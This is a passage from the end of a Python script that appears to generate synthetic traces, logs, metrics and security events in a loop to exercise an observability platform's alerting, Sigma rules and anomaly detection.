            trace_id = send_traces()
            if trace_id:
                # Send logs linked to this trace
                send_logs(trace_id=trace_id, service=random.choice(SERVICES))
            time.sleep(1)

            # Send metrics (85% normal, 15% anomalous)
            send_metrics()
            time.sleep(1)

            # Every 3 iterations, send comprehensive metrics for all services
            if iteration % 3 == 0:
                send_comprehensive_metrics()
                time.sleep(1)

            # Every 4 iterations, send custom business metrics
            if iteration % 4 == 0:
                send_custom_metrics()
                time.sleep(1)

            # Every 5 iterations, trigger alert rules
            if iteration % 5 == 0:
                print("\n🔔 Triggering alert rules...")
                send_high_error_rate_logs()
                time.sleep(1)
                send_critical_security_logs()
                time.sleep(1)

            # Every 7 iterations, trigger Sigma rules with comprehensive security events
            if iteration % 7 == 0:
                print("\n🛡️  Triggering Sigma security rules...")
                send_comprehensive_security_events()
                time.sleep(1)
                send_stream_test_sigma_logs()
                time.sleep(1)

            # Every 6 iterations, test multi-metric anomaly detection
            if iteration % 6 == 0:
                print("\n🚨 Testing Multi-Metric Anomaly Detection...")
                print("   Step 1: Sending anomalous metrics (extreme values)...")
                send_anomalous_metrics()
                time.sleep(2)  # Give time for metrics to be ingested

                print("   Step 2: Calling detection endpoint (ensemble ML)...")
                anomaly_id = detect_multi_metric_anomalies()

                if anomaly_id:
                    time.sleep(1)
                    print(f"   Step 3: Running deep dive analysis on anomaly {anomaly_id}...")
                    analyze_anomaly(anomaly_id)

                time.sleep(1)

            # Every 10 iterations, test metric normalization
            if iteration % 10 == 0:
                test_metric_normalization()
                time.sleep(1)

            # Wait before next iteration
            sleep_time = random.randint(3, 8)
            print(f"\n⏸️  Sleeping for {sleep_time} seconds...")
            time.sleep(sleep_time)

        except KeyboardInterrupt:
            print("\n\n🛑 Stopping data generator...")
            break
        except Exception as e:
            print(f"\n❌ Unexpected error: {e}")
            time.sleep(5)


if __name__ == "__main__":
    run_continuous_generation()
